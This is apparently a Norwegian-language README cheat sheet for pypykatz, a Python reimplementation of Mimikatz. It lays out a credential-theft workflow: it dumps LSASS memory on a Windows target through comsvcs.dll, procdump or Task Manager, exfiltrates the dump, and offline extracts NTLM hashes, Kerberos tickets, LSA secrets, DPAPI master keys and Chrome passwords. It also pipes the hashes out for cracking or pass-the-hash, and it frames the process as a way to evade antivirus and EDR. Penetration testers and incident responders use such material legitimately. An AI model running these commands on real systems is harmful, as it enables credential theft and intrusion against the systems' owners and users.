<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# pypykatz Jukseark

[pypykatz](https://github.com/skelsec/pypykatz) er en ren Python-implementering av [Mimikatz](https://github.com/gentilkiwi/mimikatz). Den gjør det mulig for penetrasjonstestere og hendelsesvarere å analysere Windows LSASS-minnedumper, SAM/SYSTEM/SECURITY-registerhives, DPAPI-nøkler og Kerberos-billetter helt offline på Linux og macOS uten å utløse Windows Defender, agenter for endepunktdeteksjon og -respons (EDR), eller trenge live Windows-vertstilgang.

---

## Innholdsfortegnelse

- [Oversikt og operasjonell sikkerhet (OpSec)](#overview--operational-security-opsec)
- [Installasjon](#installation)
- [Offline LSASS Dump Parsing (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM & SYSTEM Hive Extraction (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [LSA Secrets Extraction (`registry security`)](#lsa-secrets-extraction-register-security)
- [DPAPI-hovednøkler og legitimasjonsanalyse](#dpapi-master-nøkler--legitimasjons-parsing)
– [JSON Export & Automated Credential Pipelines](#json-export--automated-credential-pipelines)
- [Teknikker for å trygt dumpe LSASS på Windows](#teknikker-å-trygg-dumpe-lsass-på-vinduer)

---

## Oversikt og operasjonell sikkerhet (OpSec)

Å kjøre standard `mimikatz.exe` på en Windows-målmaskin utløser ofte atferdssensorer og statiske signaturer. `pypykatz` skiller dumpingfasen fra parsingsfasen:
1. Dump LSASS-prosessminnet ved å bruke native eller LOLBAS-verktøy (Task Manager, `procdump`, `rundll32.exe` eller `comsvcs.dll`).
2. Ekfiltrer `.dmp`-filen til ditt Linux-analysesystem.
3. Parse legitimasjon helt offline med `pypykatz` med null AV-risiko.

---

## Installasjon
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Offline LSASS Dump Parsing (`lsa minidump`)

Parse minnedumper generert fra `lsass.exe` for å hente klartekstpassord, NTLM-hasher, SHA1-hasher, Kerberos-billetter (TGT/TGS) og AES-krypteringsnøkler:

### 1. Grunnleggende Minidump Parsing
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
Utdata trekker ut legitimasjon partisjonert av sikkerhetsleverandører:
- **msv1_0:** Brukernavn, domener, NTLM-hasher og LM-hasher.
- **wdigest:** Klartekstpassord (hvis Wdigest-bufring er aktivert).
- **kerberos:** Kerberos-billettøkter og AES-nøkler.
- **ssp:** Påloggingsinformasjon for leverandør av sikkerhetsstøtte.
- **livessp:** Microsoft-kontolegitimasjon.
- **cloudap:** Azure AD Primary Refresh Tokens (PRT) og øktnøkler.

### 2. Parse flere minnedumper rekursivt
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## SAM & SYSTEM Hive Extraction (`registry sam`)

Trekk ut lokale kontobrukernavn, RID-er og NTLM-passordhasher fra frakoblede Windows-registerfiler:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Produksjon:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## LSA Secrets Extraction (`registry security`)

Gjenopprett LSA-hemmeligheter, maskinkontopassord, standard domenepassord og klartekstnøkler for tjenestekontoer fra `SECURITY` og `SYSTEM` bikuber:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Ekstraherte hemmeligheter inkluderer:
- `_SC_DefaultPassword`: Autologon-legitimasjon.
- `$MACHINE.ACC`: Domenedatamaskinkonto NTLM hashes.
- Bufret domenelegitimasjon (DCC2 / mscache2).

---

## DPAPI-hovednøkler og legitimasjonsanalyse

Data Protection API (DPAPI) krypterer Chrome-passord, Wi-Fi-nøkler og RDP-legitimasjon:

### 1. Pakk ut DPAPI-hovednøkler fra Registry & SYSTEM
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Dekrypter Chrome-lagrede passord
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## JSON Export & Automated Credential Pipelines

Eksporter analysert legitimasjon direkte til JSON for umiddelbar inntak i Hashcat, BloodHound eller CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Trekk ut rene NTLM-hasher ved hjelp av `jq` for umiddelbar hash-cracking eller pass-the-hash:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Teknikker for å trygt dumpe LSASS på Windows

For å mate minne inn i `pypykatz`, lag en LSASS-minidump på målverten ved å bruke native komponenter:

### 1. Native LOLBAS via `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. Task Manager GUI
1. Åpne Oppgavebehandling som administrator.
2. Under **Detaljer** høyreklikker du `lsass.exe`.
3. Klikk på **Opprett dumpfil** (lagret i `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Når den er lastet ned til din Linux-maskin, kjør `pypykatz lsa minidump lsass.dmp`.*